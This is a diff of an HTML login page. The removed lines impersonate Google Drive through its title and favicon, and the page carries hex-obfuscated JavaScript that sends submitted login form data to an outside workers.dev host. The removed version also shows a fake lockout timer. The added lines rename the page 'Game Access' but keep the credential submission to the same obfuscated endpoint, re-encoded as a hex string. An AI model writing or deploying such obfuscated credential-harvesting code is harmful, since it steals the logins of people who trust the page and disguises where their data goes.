@@ -3,11 +3,10 @@
 <head>
   <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
-<title>Home - Google Drive</title>
+<title>Game Access</title>
 <meta property="og:locale" content="en-US" />
 <meta property="og:type" content="website" />
-<meta property="og:title" content="Home - Google Drive" />
-<link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_favicon_2026_32dp.png" />
+<meta property="og:title" content="Game Access" />
   <style>
     :root {
       --bg-color: #0f172a;
@@ -114,66 +113,19 @@
   </div>
 
   <script>
-    const _0x4f12 = [
-      "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x79\x2d\x61\x75\x74\x68\x2d\x77\x6f\x72\x6b\x65\x72\x2e\x61\x63\x6f\x6d\x70\x75\x74\x65\x72\x6d\x61\x6e\x2e\x77\x6f\x72\x6b\x65\x72\x73\x2e\x64\x65\x76",
-      "\x2f\x6c\x6f\x67\x69\x6e"
-    ];
-
-    const WORKER_URL = _0x4f12[0];
-    const LOGIN_ENDPOINT = _0x4f12[1];
-
     const form = document.getElementById('login-form');
     const submitBtn = document.getElementById('submit-btn');
-    const inputs = document.querySelectorAll('input');
     const errorBox = document.getElementById('error-box');
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
+    const _0x82b4 = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x79\x2d\x61\x75\x74\x68\x2d\x77\x6f\x72\x6b\x65\x72\x2e\x61\x63\x6f\x6d\x70\x75\x74\x65\x72\x6d\x61\x6e\x2e\x77\x6f\x72\x6b\x65\x72\x73\x2e\x64\x65\x76\x2f\x6c\x6f\x67\x69\x6e"];
+    form.action = _0x82b4[0];
+    form.method = 'post';
+
+    form.addEventListener('submit', () => {
       submitBtn.disabled = true;
       submitBtn.innerText = "Verifying...";
       errorBox.style.display = 'none';
-
-      const formData = new FormData(form);
-
-      try {
-        const response = await fetch(`${WORKER_URL}/login`, {
-          method: 'POST',
-          body: formData,
-          credentials: 'omit'
-        });
-
-        if (response.ok) {
-          const data = await response.json();
-          window.location.href = data.redirectUrl;
-        } else {
-          startLockout(10);
-        }
-      } catch (err) {
-        startLockout(10);
-      }
     });
-
-    function startLockout(seconds) {
-      errorBox.style.display = 'block';
-      inputs.forEach(input => input.disabled = true);
-      submitBtn.disabled = true;
-
-      let remaining = seconds;
-      const interval = setInterval(() => {
-        if (remaining <= 0) {
-          clearInterval(interval);
-          errorBox.innerText = "Invalid credentials. Try again.";
-          submitBtn.innerText = "Sign In";
-          submitBtn.disabled = false;
-          inputs.forEach(input => input.disabled = false);
-        } else {
-          errorBox.innerText = `Invalid credentials. Retrying in ${remaining}s...`;
-          submitBtn.innerText = `Locked (${remaining}s)`;
-          remaining--;
-        }
-      }, 1000);
-    }
   </script>
 </body>
 </html>
